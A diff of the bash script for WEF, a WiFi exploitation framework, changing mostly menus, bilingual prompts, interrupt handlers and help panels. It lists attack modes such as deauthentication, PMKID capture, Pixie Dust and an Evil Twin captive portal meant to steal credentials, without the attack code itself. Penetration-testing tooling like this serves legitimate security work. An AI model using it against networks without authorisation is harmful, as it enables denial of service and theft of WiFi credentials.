@@ -2,196 +2,207 @@
 
 #--------------------------------
 #
-# The Swiss Army Knife for 802.11 Exploitation, WiFi Phishing and Bluetooth Hacking (WIP)
-#
-# By D3Ext and megazar (WiFi Exploitation Framework)
+# WEF - WiFi Exploitation Framework
+# By D3Ext and megazar
 # Twitter: @d3ext and @megazar21
 # Website: https://d3ext.github.io/
 # Mail: <d3ext@proton.me>
 # Github(s): https://github.com/D3Ext and https://github.com/ultrazar
 #
-# I'm not responsible of any bad usage of this tool
-#
 #--------------------------------
 
-# Colors and formats
-greenC="\e[0;32m\033[1m"
-endC="\033[0m\e[0m"
-rC="\e[0;31m\033[1m"
-blueC="\e[0;34m\033[1m"
-yC="\e[0;33m\033[1m"
-grayC="\e[0;37m\033[1m"
-underline="\033[4m"
 
-export DEBIAN_FRONTEND=noninteractive
+
+#
+# Functions used to catch Ctrl+C sigterm, to remove temporal files and to revert interface changes
+#
 
 # Ctrl + C
 function ctrl_c(){
-  color_output_ln "!" "Exiting...\n"
   if [ "$(check_interface_mode)" == "monitor" ]; then
-    killall aireplay-ng airodump-ng 2>/dev/null
-    card_stop
+    killall aireplay-ng airodump-ng mdk4 2>/dev/null
+
+    while true; do
+      if [ "$lang" == "en" ]; then
+        color_output_no_line "*" "Do you want to disable monitor mode? (default=yes) [${yC}y${blueC}/${yC}n${blueC}]: " && read disable_opt
+      else
+        color_output_no_line "*" "¿Quieres desactivar el modo monitor? (por defecto=si) [${yC}s${blueC}/${yC}n${blueC}]: " && read disable_opt
+      fi
+
+      if [ "$disable_opt" == "y" ] || [ "$disable_opt" == "yes" ] || [ "$disable_opt" == "s" ] || [ "$disable_opt" == "si" ]; then
+        disable_mon
+        break
+      elif [ ! "$disable_opt" ]; then
+        disable_mon
+        break
+      elif [ "$disable_opt" != "n" ] || [ "$disable_opt" != "no" ]; then
+        color_output "X" "Invalid option"
+      fi
+    done
   fi
+
+  # Avoid errors by killing possible processes which haven't been killed (shouldn't occur, just to prevent)
+  kill -9 ${air_PID} 2>/dev/null; wait ${air_PID} 2>/dev/null
+  kill -9 ${air2_PID} 2>/dev/null; wait ${air2_PID} 2>/dev/null
+  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null
+  kill -9 ${hcx_PID} 2>/dev/null; wait ${hcx_PID} 2>/dev/null
+  kill -9 ${reaver_PID} 2>/dev/null; wait ${reaver_PID} 2>/dev/null
+  kill -9 ${replay_PID} 2>/dev/null; wait ${replay_PID} 2>/dev/null
+  kill -9 ${passive_PID} 2>/dev/null; wait ${passive_PID} 2>/dev/null
 
   wpa_process=$(pidof wpa_supplicant)
   net_process=$(pidof NetworkManager)
   if [ ! "$wpa_process" ]; then
-    color_output "*" "Restarting connections"
+    if [ "$lang" == "en" ]; then
+      color_output "*" "Restarting connections"
+    else
+      color_output "*" "Restableciendo conexiones"
+    fi
+
     systemctl restart wpa_supplicant 2>/dev/null
     if [ ! "$net_process" ]; then
       systemctl restart NetworkManager 2>/dev/null
     fi
   fi
-  # Remove possible created during the attacks
-  rm ${dir}/*.tmp \
-    ${dir}/rainbowtables \
-    ${dir}/wef-wordlist.txt \
-    ${dir}/pmkid_hashes \
-    ${dir}/pmkid_capture \
-    ${dir}/scan_output 2>/dev/null
-  
-  #tput cnorm;
+
+  if [ "$lang" == "en" ]; then
+    color_output "!" "Exiting..."
+  else
+    color_output "!" "Saliendo..."
+  fi
+
+  # Remove files created during the attacks
+  rm /tmp/.scan_output 2>/dev/null
   exit 0
 }
 
-# Ctrl + C for the EvilTwin attack
+# Ctrl + C for EvilTwin attack
 function evil_c(){
-  echo; color_output_ln "!" "Removing files..."
+  echo
   # Kill created processes
-  killall hostapd dnsmasq php &>/dev/null
-  # Kill the http server
-  fuser -k 80/tcp &>/dev/null
-  # Reconfigure the network adapter
-  ifconfig ${evilCard} down 2>/dev/null
-  # Return to the directory
-  popd &>/dev/null
-  color_output_ln "!" "Stoping hostapd and dnsmasq..."; sleep 0.2
+  if [ "$lang" == "en" ]; then
+    color_output_ln "!" "Stoping processes..."
+  else
+    color_output_ln "!" "Parando procesos..."
+  fi
+  killall hostapd hostapd-wpe dnsmasq dhcp aireplay-ng xterm lighttpd &>/dev/null
+  systemctl restart systemd-resolved &>/dev/null
 
-  iwconfig ${evilCard} mode managed 2>/dev/null; sleep 0.2
-  ifconfig ${evilCard} up 2>/dev/null; sleep 0.1
-  airmon-ng start ${evilCard} &>/dev/null
-  back="1"
+  # Reconfigure the network adapter
+  if [ "$lang" == "en" ]; then
+    color_output "*" "Reconfiguring interface"
+  else
+    color_output "*" "Reconfigurando la interfaz"
+  fi
+
+  restore_interface_eviltwin
+}
+
+# Ctrl + C for cracking processes
+function crack_c(){
+  echo
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "Interrupt received, do you want to exit? [${yC}y${blueC}/${yC}n${blueC}]: " && read crack_opt
+  else
+    color_output_no_line "*" "Interrupción detectada, quieres salir? [${yC}s${blueC}/${yC}n${blueC}]: " && read crack_opt
+  fi
+
+  if [ "$crack_opt" == "y" ] || [ "$crack_opt" == "yes" ] || [ "$crack_opt" == "s" ] || [ "$crack_opt" == "si" ]; then
+    killall hashcat john aircrack-ng 2>/dev/null
+    keep_exit
+  fi
 }
 
 # Ctrl + C for inhibition function
 function inhibition_c(){
-  sleep 0.1
   # Kill deauth process
   killall aireplay-ng 2>/dev/null
-  sleep 0.1
 }
 
-# Help Panel function
-function helpPanel(){
-  echo -e "${yC} __      _____ ___ "
-  echo -e " \ \    / / __| __|"
-  echo -e "  \ \/\/ /| _|| _| "
-  echo -e "   \_/\_/ |___|_|  "
-  echo -e "\n${blueC}[${yC}WEF${blueC}] Wi-Fi Exploitation Framework ${yC}${program_version}${endC}"
+function keep_exit(){
+  if [ "$lang" == "en" ]; then
+    echo -ne "${blueC}[${yC}*${blueC}] Do you want to exit from tool (${yC}y${blueC}) or going back to main menu (${yC}n${blueC})? : ${endC}" && read exit_status
+  else
+    echo -ne "${blueC}[${yC}*${blueC}] ¿Quieres salir de la herramienta (${yC}s${blueC}) o volver al menu (${yC}n${blueC})? : ${endC}" && read exit_status
+  fi
 
-  list_interfaces # Show active interfaces (excluding the ethernet and loopback ones)
-  echo -e "\n${blueC}Required parameters:"
-  echo -e "\t${yC}-i, --interface)${blueC} \tThe name of your interface in managed mode"
-  echo -e "\nOptional parameters:"
-  echo -e "\t${yC}-v, --verbose)${blueC} \t\tShow more info during the attacks"
-  echo -e "\t${yC}-h, --help)${blueC} \t\tShows this help panel"
-  echo -e "\t${yC}--version)${blueC} \t\tPrint the version and exit${endC}\n"
-  exit 0
+  # If input is y or yes exit from the function
+  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
+    ctrl_c
+  elif [ "$exit_status" != "n" ] && [ "$exit_status" != "no" ]; then
+    if [ "$lang" == "en" ]; then
+      color_output "X" "Unknown option"
+    else
+      color_output "X" "Opción inválida"
+    fi
+
+    keep_exit
+  fi
 }
 
-# First banner function
-function banner1(){
-  echo -e "${yC} █     █░▓█████   █████▒"
-  echo -e "▓█░ █ ░█░▓█   ▀ ▓██   ▒ "
-  echo -e "▒█░ █ ░█ ▒███   ▒████ ░     ${blueC}[${yC}WEF${blueC}] WiFi Exploitation Framework ${yC}${program_version}"
-  echo -e "░█░ █ ░█ ▒▓█  ▄ ░▓█▒  ░ "
-  echo -e "░░██▒██▓ ░▒████▒░▒█░    "
-  echo -e "░ ▓░▒ ▒  ░░ ▒░ ░ ▒ ░    "
-  echo -e "  ▒ ░ ░   ░ ░  ░ ░      "
-  echo -e "  ░   ░     ░    ░ ░    "
-  echo -e "    ░       ░  ░        "
-  echo -e "${endC}"
+function keep_exit_c(){
+  # Workaround to stop mdk4 attacks
+  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null
+  killall hashcat john aircrack-ng 2>/dev/null
+
+  if [ "$lang" == "en" ]; then
+    echo -ne "\n${blueC}[${yC}*${blueC}] Interrupt received, do you want to exit from tool? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read exit_status
+  else
+    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read exit_status
+  fi
+
+  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
+    ctrl_c
+  elif [ "$exit_status" == "n" ] || [ "$exit_status" == "no" ]; then
+    if [[ $input == 1 ]]; then
+      echo -ne "${blueC}[${yC}WEF${blueC}] >>${endC} "
+    fi
+  else
+    if [ "$lang" == "en" ]; then
+      color_output "X" "Unknown option"
+    else
+      color_output "X" "Opción inválida"
+    fi
+
+    keep_exit_c
+  fi
 }
 
-# Second banner dunction
-function banner2(){
-  echo -e "${yC} █████   ███   █████ ██████████ ███████████"
-  echo -e "░░███   ░███  ░░███ ░░███░░░░░█░░███░░░░░░█"
-  echo -e " ░███   ░███   ░███  ░███  █ ░  ░███   █ ░ "
-  echo -e " ░███   ░███   ░███  ░██████    ░███████         ${blueC}[${yC}WEF${blueC}] WiFi Exploitation Framework ${yC}${program_version}"
-  echo -e " ░░███  █████  ███   ░███░░█    ░███░░░█   "
-  echo -e "  ░░░█████░█████░    ░███ ░   █ ░███  ░    "
-  echo -e "    ░░███ ░░███      ██████████ █████      "
-  echo -e "     ░░░   ░░░      ░░░░░░░░░░ ░░░░░       "
-  echo -e "${endC}"
+function keep_exit_eviltwin(){
+  if [ "$lang" == "en" ]; then
+    echo -ne "\n${blueC}[${yC}*${blueC}] Interrupt received, do you want to exit from tool? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read exit_status
+  else
+    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read exit_status
+  fi
+
+  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
+    evil_c
+    exit 0
+  elif [ "$exit_status" != "n" ] && [ "$exit_status" != "no" ]; then
+    if [ "$lang" == "en" ]; then
+      color_output "X" "Unknown option"
+    else
+      color_output "X" "Opción inválida"
+    fi
+
+    keep_exit_eviltwin
+  fi
 }
 
-# Third banner function
-function banner3(){
+
+
+#
+# Logging functions to not to repeat code a lot of times
+#
+
+function banner(){
   echo -e "${yC}██╗    ██╗███████╗███████╗"
   echo -e "██║    ██║██╔════╝██╔════╝               "
   echo -e "██║ █╗ ██║█████╗  █████╗                 "
   echo -e "██║███╗██║██╔══╝  ██╔══╝       ${blueC}[${yC}WEF${blueC}] WiFi Exploitation Framework ${yC}${program_version}"
   echo -e "╚███╔███╔╝███████╗██║                    "
-  echo -e " ╚══╝╚══╝ ╚══════╝╚═╝     "
-  echo -e "${endC}   "
+  echo -e " ╚══╝╚══╝ ╚══════╝╚═╝${endC}"
 }
-
-# Banner4 Function
-function banner4(){
-  echo -e "${yC} _______  __   __  ___   ___        _______  _     _  ___   __    _ "
-  echo -e "|       ||  | |  ||   | |   |      |       || | _ | ||   | |  |  | |"
-  echo -e "|    ___||  |_|  ||   | |   |      |_     _|| || || ||   | |   |_| |"
-  echo -e "|   |___ |       ||   | |   |        |   |  |       ||   | |       |"
-  echo -e "|    ___||       ||   | |   |___     |   |  |       ||   | |  _    |"
-  echo -e "|   |___  |     | |   | |       |    |   |  |   _   ||   | | | |   |"
-  echo -e "|_______|  |___|  |___| |_______|    |___|  |__| |__||___| |_|  |__|${endC}"
-}
-
-# Banner Randomizer
-function all_banners(){
-  # Get random number between 1 and 3 to display a random banner
-  random_number=$(($RANDOM % 3 + 1))
-
-  if [ "$random_number" == "1" ]; then
-    banner1
-  elif [ "$random_number" == "2" ]; then
-    banner2
-  elif [ "$random_number" == "3" ]; then
-    banner3
-  fi
-}
-
-# Auxiliar function to check if a dir exists and create it
-function check_and_create(){
-  if [ ! -d "${1}" ]; then
-    mkdir "${1}" 2>/dev/null
-  fi
-}
-
-function log_monitor_is_disabled(){ # This function is used when user selects an attack and monitor mode isn't enabled
-  color_output_ln "*" "Your card is not in monitor mode."
-  echo -e "${blueC}[${yC}*${blueC}] Please before doing any attack press the ${yC}Start network card${blueC} option${endC}"
-}
-
-function list_interfaces(){
-  interfaces_out=$(ifconfig | grep ": flags=" | awk '{print $1}' FS=":" | grep -v "lo")
-
-  color_output_ln "*" "Interfaces:"
-  while IFS= read -r line; do
-    echo -e "\t${grayC}${line}${endC}"
-  done <<< "${interfaces_out}"
-}
-
-function reset_info(){ # This function sets some important variables, which are used during attacks, to "" (empty) to avoid errors and more
-  channel=""
-  name=""
-  attack_time=""
-}
-
-#
-# Beggining of the logging functions
-#
 
 function color_output_ln(){
   echo -e "\n${blueC}[${yC}${1}${blueC}] ${2}${endC}"
@@ -205,6 +216,10 @@ function color_output_no_line(){
   echo -ne "${blueC}[${yC}${1}${blueC}] ${2}${endC}"
 }
 
+function color_output_tab(){
+  echo -e "\t${blueC}[${yC}${1}${blueC}] ${2}${endC}"
+}
+
 function good_output_ln(){
   echo -e "\n${blueC}[${greenC}${1}${blueC}] ${2}${endC}"
 }
@@ -213,6 +228,19 @@ function good_output(){
   echo -e "${blueC}[${greenC}${1}${blueC}] ${2}${endC}"
 }
 
+function press_enter_attack(){
+  if [ "$lang" == "en" ]; then
+    echo -ne "\n${grayC}Press Enter to continue and launch attack${endC} " && read continue
+  else
+    echo -ne "\n${grayC}Presiona Enter para continuar y lanzar el ataque${endC} " && read continue
+  fi
+}
+
+function press_enter(){
+  echo -ne "\n${grayC}${1}${endC}" && read continue
+}
+
+# Create a simple progress bar with dots
 function progress_bar(){
   echo -ne "${blueC}[${yC}${3}${blueC}] ${4}"
   for ((i = 0; i <= ${1}; i++)); do
@@ -223,99 +251,210 @@ function progress_bar(){
   echo -e "${endC}"
 }
 
-#
-# End of the logging auxiliary functions
-#
+# This function is used when user selects an attack and monitor mode isn't enabled
+function log_monitor_is_disabled(){
+  if [ "$lang" == "en" ]; then
+    color_output_ln "*" "Your network card interface is not in monitor mode."
+    echo -e "${blueC}[${yC}*${blueC}] Please before doing any attack type ${yC}enable${blueC} and press Enter, it will enable monitor mode${endC}"
+  else
+    color_output_ln "*" "La interfaz de la tarjeta de red no está en modo monitor."
+    echo -e "${blueC}[${yC}*${blueC}] Antes de hacer cualquier ataque escribe ${yC}enable${blueC} y presiona Enter para activar el modo monitor${endC}"
+  fi
+  clear_p=0
+}
 
-# Dependencies Function
-function dependencies(){
-  # Programs array
-  programs=(macchanger aircrack-ng reaver mdk4 hashcat hcxdumptool xterm wget dnsmasq hostapd php crackle pixiewps)
-  system=$(cat /etc/os-release | grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"')
-  if [ "${system}"  == "Parrot" ] || [ "${system}"  == "Kali" ] || [ "${system}"  == "Ubuntu" ]; then
-    for program in "${programs[@]}"; do
-      which $program &>/dev/null
-      if [ "$(echo $?)" == "1" ]; then
-        color_output_ln "*" "Requirements not installed"
-        color_output "*" "Installing ${program}..."
-        apt install "${program}" -y &>/dev/null
-      fi
-    done
-
-  elif [ "${system}"  == "Arch" ] || [ "$(echo \"${system}\" | grep -i \"arch\")" ]; then
-    for program in "${programs[@]}"; do
-      which $program &>/dev/null
-      if [ "$(echo $?)" == "1" ]; then
-        color_output_ln "*" "Requirements not installed"
-        color_output "*" "Installing ${program}..."
-        pacman -S "${program}" --noconfirm &>/dev/null
-      fi
-    done
+# Tell the user that the attack has been completed and a log was stored under logs folder
+function log_completed(){
+  if [ "$lang" == "en" ]; then
+    good_output_ln "+" "Attack completed"; sleep 0.1
+    color_output "*" "Log with some attack info was stored in /opt/wef/main/logs/${name}.log"
+  else
+    good_output_ln "+" "Ataque completado"; sleep 0.1
+    color_output "*" "Log con información sobre el ataque ha sido creado en /opt/wef/main/logs/${name}.log"
   fi
 }
 
-# Functions Info
-function functions_info(){
-  # Print info about the different attacks and functions
-  color_output_ln "WEF" "Tested with an ${yC}Alfa AWUS036ACM${blueC} adapter"; sleep 0.1
-  color_output_ln "1" "Beacon Flood Attack:"; sleep 0.1; echo -ne "\t"
-  color_output_no_line "*" "It creates a lot of fake APs to produce a DoS and kick the devices connected to the APs in the given channel [${yC}WPA${blueC}/${yC}WEP${blueC}]"; sleep 0.1
-  color_output_ln "2" "Deauthentication Attack:"; sleep 0.1; echo -ne "\t"
-  color_output_no_line "*" "In this attack you send specific deauthentication packets to an AP to tell the router that a device is not connected and kicking it [${endC}${yC}WPA${endC}${blueC}]"; sleep 0.1
-  color_output_ln "3" "Authentication Attack:"; sleep 0.1; echo -ne "\t"
-  color_output_no_line "*" "It's an attack in which you inject a lot of fake users to an Access Point [${yC}WEP${blueC}]"; sleep 0.1
-  color_output_ln "4" "PMKID Attack:"; sleep 0.1; echo -ne "\t"
-  color_output_no_line "*" "It's an special attack, because it doesn't require clients connected to an Access Point [${yC}WPA${blueC}]"; sleep 0.1
-  color_output_ln "5" "Passive/Stealthy Attack:"; sleep 0.1; echo -ne "\t"
-  color_output_no_line "*" "This attack keeps looking for handshakes when someone connects to the AP [${yC}WPA${blueC}/${yC}WEP${blueC}]"; sleep 0.1
-  color_output_ln "6" "MAC Randomization:"; sleep 0.1; echo -ne "\t"
-  color_output_no_line "*" "This function set a new random and fake mac address for your interface"; sleep 0.1
-  color_output_ln "7" "Start network card:"; sleep 0.1; echo -ne "\t"
-  color_output_no_line "*" "This feature starts your network adapter in monitor mode for injecting packages"; sleep 0.1
-  color_output_ln "8" "Evil Twin Attack:"; sleep 0.1; echo -ne "\t"
-  color_output_no_line "*" "It deploys a public and fake AP to steal credentials from clients with a lot of templates"; sleep 0.1
-  color_output_ln "9" "Attacks info:"; sleep 0.1; echo -ne "\t"
-  color_output_no_line "*" "It displays this help panel about the availables functions"; sleep 0.1
-  color_output_ln "10" "Pixie Dust Attack:"; sleep 0.1; echo -ne "\t"
-  color_output_no_line "*" "This attack try to exploit the WPS method [${yC}WPA${blueC}]"; sleep 0.1
-  color_output_ln "11" "Caffe Latte Attack:"; sleep 0.1; echo -ne "\t"
-  color_output_no_line "*" "It fakes the target AP to obtain the password in clear text [${yC}WEP${blueC}]"; sleep 0.1
-  color_output_ln "12" "Chopchop Attack:"; sleep 0.1; echo -ne "\t"
-  color_output_no_line "*" "This attack send a fake and specific packet to decrypt the password in plain text [${yC}WEP${blueC}]"; sleep 0.1
-  color_output_ln "13" "Michael Attack:"; sleep 0.1; echo -ne "\t"
-  color_output_no_line "*" "It exploits the TKIP encryption and cancels the connection of an AP (in rare cases it shutdowns the router) [${yC}WPA${blueC}/${yC}WEP${blueC}]"; sleep 0.1
-  color_output_ln "14" "Replay Attack:"; sleep 0.1; echo -ne "\t"
-  color_output_no_line "*" "This attack is performed installing an all-zero encryption key in the target to decrypt the data [${endC}${yC}WEP${endC}${blueC}]\n"; sleep 0.1
-  sleep 0.1
+# Tell the user that he/she can type "back" and he/she will return to main menu
+function log_back_to_menu(){
+  if [ "$lang" == "en" ]; then
+    color_output_ln "*" "Type '${yC}back${blueC}' to return to the main menu"
+  else
+    color_output_ln "*" "Escribe '${yC}back${blueC}' para volver al menú principal"
+  fi
 }
 
-# Exit Function
-function keep_exit(){
-  echo -e "\n"
-  while true; do
-    echo -ne "${blueC}[${yC}*${blueC}] Do you want to exit? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read exit_status
+function log_attack_info(){
+  if [ "$lang" == "en" ]; then
+    good_output "+" "Attack information"
+  else
+    good_output "+" "Información del ataque"
+  fi
 
-    # If input is y or yes exit from the function
-    if [ "${exit_status}" == "y" ] || [ "${exit_status}" == "yes" ]; then
-      if [ "$module" == "wifi" ]; then
-        ctrl_c
-      #elif [ "$module" == "bluetooth" ]; then
-        #blue_c
-      fi
+  if [ "$name" ]; then
+    echo -e "${blueC} ESSID:${grayC} ${name}${endC}"
+  fi
 
-    # If input is "n" or "no" break the loop and return to the main function
-    elif [ "${exit_status}" == "n" ] || [ "${exit_status}" == "no" ]; then
-      break
-    elif [ "${exit_status}" != "y" ] && [ "${exit_status}" != "n" ]; then
-      color_output_ln "X" "Unknown option"
-      keep_exit
+  if [ "$ap_mac" ]; then
+    echo -e "${blueC} BSSID:${grayC} ${ap_mac}${endC}"
+  fi
+
+  if [ "$channel" ]; then
+    if [ "$lang" == "en" ]; then
+      echo -e "${blueC} Channel:${grayC} ${channel}${endC}"
+    else
+      echo -e "${blueC} Canal:${grayC} ${channel}${endC}"
     fi
-  done
+  fi
+
+  if [ "$attack_time" ]; then
+    if [ "$lang" == "en" ]; then
+      echo -e "${blueC} Duration:${grayC} ${attack_time}${endC}"
+    else
+      echo -e "${blueC} Duración:${grayC} ${attack_time}${endC}"
+    fi
+  fi
+
+  if [ "$packets_to_send" ]; then
+    if [ "$lang" == "en" ]; then
+      echo -e "${blueC} Packets:${grayC} ${packets_to_send}${endC}"
+    else
+      echo -e "${blueC} Paquetes:${grayC} ${packets_to_send}${endC}"
+    fi
+  fi
+
+  if [ "$c_h" ]; then
+    if [ "$lang" == "en" ]; then
+      echo -e "${blueC} Capture handshakes?:${grayC} ${c_h}${endC}"
+    else
+      echo -e "${blueC} Capturar handshakes?:${grayC} ${c_h}${endC}"
+    fi
+  fi
+}
+
+function log_functions_info(){
+  if [ "$lang" == "en" ]; then
+    color_output_ln "*" "You can find explanations of every attack in the official Wiki here: https://github.com/D3Ext/WEF/wiki/Attacks"
+  else
+    color_output_ln "*" "Puedes encontrar la explicación de cada ataque en la Wiki oficial aqui: https://github.com/D3Ext/WEF/wiki/Attacks"
+  fi
+}
+
+
+
+
+#
+# Help panels functions
+#
+
+function help_panel(){
+  echo -e "${yC} __      _____ ___ "
+  echo -e " \ \    / / __| __|"
+  echo -e "  \ \/\/ /| _|| _| "
+  echo -e "   \_/\_/ |___|_|  "
+  echo -e "\n${blueC}[${yC}WEF${blueC}] Wi-Fi Exploitation Framework ${yC}${program_version}${endC}"
+
+  list_interfaces # Show active interfaces (excluding the ethernet and loopback ones)
+  if [ "$lang" == "en" ]; then
+    echo -e "\n${blueC}Required parameters:"
+    echo -e "\t${yC}-i, --interface)${blueC} \tThe name of your network card interface in managed mode"
+    echo -e "\nOptional parameters:"
+    echo -e "\t${yC}-v, --verbose)${blueC} \t\tShow more info during the attacks (recommended)"
+    echo -e "\t${yC}-h, --help)${blueC} \t\tShow this help panel"
+    echo -e "\t${yC}--version)${blueC} \t\tPrint the version and exit${endC}"
+    echo -e "\t${yC}-s)${blueC} \t\t\tSet tool language to spanish${endC}\n"
+  else
+    echo -e "\n${blueC}Parametros requeridos:"
+    echo -e "\t${yC}-i, --interface)${blueC} \tEl nombre de la interfaz de tu tarjeta de red en modo managed"
+    echo -e "\nParametros opcionales:"
+    echo -e "\t${yC}-v, --verbose)${blueC} \t\tMuestra mas información durante los ataques (recomendado)"
+    echo -e "\t${yC}-h, --help)${blueC} \t\tMuestra este panel de ayuda"
+    echo -e "\t${yC}--version)${blueC} \t\tImprime por pantalla la versión actual del programa${endC}"
+    echo -e "\t${yC}-s)${blueC} \t\t\tCambia idioma al español\n"
+  fi
+  exit 0
+}
+
+# Attacks panel
+function show_panel(){
+  if [ "$lang" == "en" ]; then
+    echo -e "\n${blueC}------DoS attacks--------       ------WEP attacks---------      -----Rogue AP attacks----${endC}"
+    echo -e "${blueC}[${yC}1${blueC}] Deauthentication attack\t[${yC}8${blueC}]  Replay attack\t\t[${yC}13${blueC}] EvilTwin attack${endC}"
+    echo -e "${blueC}[${yC}2${blueC}] WIDS Confusion attack\t[${yC}9${blueC}]  ChopChop attack${endC}"
+    echo -e "${blueC}[${yC}3${blueC}] Auth DoS attack\t\t[${yC}10${blueC}] CaffeLatte attack${endC}"
+    echo -e "${blueC}[${yC}4${blueC}] Beacon Flood attack${endC}"
+    echo -e "${blueC}[${yC}5${blueC}] Michael Exploitation attack${endC}"
+    echo -e "\n${blueC}------WPS attacks--------       ------Handshake attacks---${endC}"
+    echo -e "${blueC}[${yC}6${blueC}] Pixie Dust attack\t\t[${yC}11${blueC}] WPA capture attack${endC}"
+    echo -e "${blueC}[${yC}7${blueC}] Null Pin attack\t\t[${yC}12${blueC}] PMKID attack${endC}"
+  else
+    echo -e "\n${blueC}------Ataques DoS--------       ------Ataques WEP---------      -----Ataques Rogue AP----${endC}${endC}"
+    echo -e "${blueC}[${yC}1${blueC}] Ataque de Deauthentication\t[${yC}8${blueC}]  Ataque de Replay\t\t[${yC}13${blueC}] Ataque EvilTwin${endC}"
+    echo -e "${blueC}[${yC}2${blueC}] Ataque de confusión WIDS\t[${yC}9${blueC}]  Ataque ChopChop${endC}"
+    echo -e "${blueC}[${yC}3${blueC}] Ataque Auth DoS\t\t[${yC}10${blueC}] Ataque CaffeLatte${endC}"
+    echo -e "${blueC}[${yC}4${blueC}] Ataque de Beacon Flood${endC}"
+    echo -e "${blueC}[${yC}5${blueC}] Ataque Michael Exploitation${endC}"
+    echo -e "\n${blueC}------Ataques WPS--------       ------Ataques Handshake---${endC}"
+    echo -e "${blueC}[${yC}6${blueC}] Ataque Pixie Dust\t\t[${yC}11${blueC}] Captura handshake WPA${endC}"
+    echo -e "${blueC}[${yC}7${blueC}] Ataque de Pin nulo\t\t[${yC}12${blueC}] Ataque PMKID${endC}"
+  fi
+}
+
+# Commands help panel
+function list_help(){
+  if [ "$lang" == "en" ]; then
+    echo -e "\n\t${yC}Command\t\t\tDescription"
+    echo -e "\t-------\t\t\t-----------${endC}"
+    echo -e "${blueC} \tenable\t\t\t- Enable monitor mode for especified network interface${endC}"
+    echo -e "${blueC} \tdisable\t\t\t- Disable monitor mode and enable managed mode for especified network interface${endC}"
+    echo -e "${blueC} \tmac\t\t\t- Change interface MAC with a custom or random address${endC}"
+    echo -e "${blueC} \tcheck <file.cap>\t- Check if given capture file contains at least one WPA handshake${endC}"
+    echo -e "${blueC} \tscan\t\t\t- Scan access points during 25s (also updates AP list)${endC}"
+    echo -e "${blueC} \tlist\t\t\t- List already scanned APs${endC}"
+    echo -e "${blueC} \texit/quit\t\t- Exit from the framework${endC}"
+    echo -e "${blueC} \tchipsets\t\t- List the chipsets which supports monitor mode${endC}"
+    echo -e "${blueC} \thelp/?\t\t\t- Print this help panel${endC}"
+    echo -e "${blueC} \tinhibit <ap_name>\t- Inhibit an AP connections until you press Ctrl + C (deauth all clients)${endC}"
+    echo -e "${blueC} \tinfo\t\t\t- Show info about the network card interface${endC}"
+    echo -e "${blueC} \tverbose\t\t\t- Set verbose on, to see more output${endC}"
+    echo -e "${blueC} \tno verbose\t\t- Set verbose off, to see less output${endC}"
+    echo -e "${blueC} \tattacks\t\t\t- Show info about the different attacks${endC}"
+    echo -e "${blueC} \tupdate\t\t\t- Check if an update is available and ask you to install it${endC}"
+    echo -e "${blueC} \tversion\t\t\t- Print the info about the version of wef${endC}"
+    echo -e "${blueC} \tpanel\t\t\t- Display attack options panel${endC}"
+    echo -e "${blueC} \tclear/cls\t\t- Clear the screen${endC}"
+  else
+    echo -e "\n\t${yC}Comando\t\t\tDescripción"
+    echo -e "\t-------\t\t\t-----------${endC}"
+    echo -e "${blueC} \tenable\t\t\t- Habilita el modo monitor en la interfaz de red especificada${endC}"
+    echo -e "${blueC} \tdisable\t\t\t- Desactiva el modo monitor y habilita el modo managed en la interfaz de red especificada${endC}"
+    echo -e "${blueC} \tmac\t\t\t- Cambia la MAC de la interfaz por una dirección concreta o una aleatoria${endC}"
+    echo -e "${blueC} \tcheck <file.cap>\t- Comprueba si el archivo especificado contiene al menos un handshake WPA${endC}"
+    echo -e "${blueC} \tscan\t\t\t- Escanea los puntos de acceso cercanos durante 25s (recarga la lista si ya se han escaneado)${endC}"
+    echo -e "${blueC} \tlist\t\t\t- Muestra la lista los APs escaneados${endC}"
+    echo -e "${blueC} \texit/quit\t\t- Salir del framework${endC}"
+    echo -e "${blueC} \tchipsets\t\t- Lista los chipsets que soportan modo monitor${endC}"
+    echo -e "${blueC} \thelp/?\t\t\t- Imprime este panel de comandos${endC}"
+    echo -e "${blueC} \tinhibit <ap_name>\t- Inhibe las conexiones de un AP hasta que presiones Ctrl + C (deautentica a todos los clientes)${endC}"
+    echo -e "${blueC} \tinfo\t\t\t- Muestra información sobre la interfaz de la tarjeta de red${endC}"
+    echo -e "${blueC} \tverbose\t\t\t- Activa el verbose, para ver mas info durante los ataques${endC}"
+    echo -e "${blueC} \tno verbose\t\t- Desactiva el verbose, para ver menos info durante los ataque${endC}"
+    echo -e "${blueC} \tattacks\t\t\t- Muestra info sobre los diferentes ataques${endC}"
+    echo -e "${blueC} \tupdate\t\t\t- Comprueba si hay alguna actualización disponible y la instala${endC}"
+    echo -e "${blueC} \tversion\t\t\t- Imprime la version actual de la herramienta${endC}"
+    echo -e "${blueC} \tpanel\t\t\t- Muestra el panel con las opciones de los ataques${endC}"
+    echo -e "${blueC} \tclear/cls\t\t- Limpia la pantalla${endC}"
+  fi
+}
+
+function evil_twin_panel() {
+  color_output "1" "Rogue AP - Captive Portal"
+  color_output "2" "Rogue AP - Captive Portal - DoS (recommended)"
+  #color_output "3" "Rogue AP - Captive Portal - WiFi Enterprise"
+  #color_output "4" "Rogue AP - Captive Portal - WiFi Enterprise - DoS"
 }
 
 # Chipsets for monitor mode
 function chipsets_panel(){
-  # Print some of the chipsets that support monitor mode
   echo -e "\n\t${yC}Chipsets"
   echo -e "\t--------${blueC}"
   echo -e " \tRTL8812AU"
@@ -326,155 +465,21 @@ function chipsets_panel(){
   echo -e " \tRTL8188EUS${endC}"
